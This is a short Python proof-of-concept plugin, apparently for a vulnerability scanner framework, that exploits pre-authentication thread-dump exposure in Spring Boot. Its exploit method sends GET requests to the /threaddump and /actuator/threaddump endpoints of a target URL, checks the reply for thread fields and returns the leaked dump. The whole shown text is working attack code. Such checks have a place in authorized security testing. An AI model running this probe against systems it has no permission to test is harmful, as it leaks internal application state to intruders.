...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth threaddump Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/threaddump","/actuator/threaddump"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if '"threads":' in res.text and '"threadName":' in res.text and "application" in res.text:
                return res.text
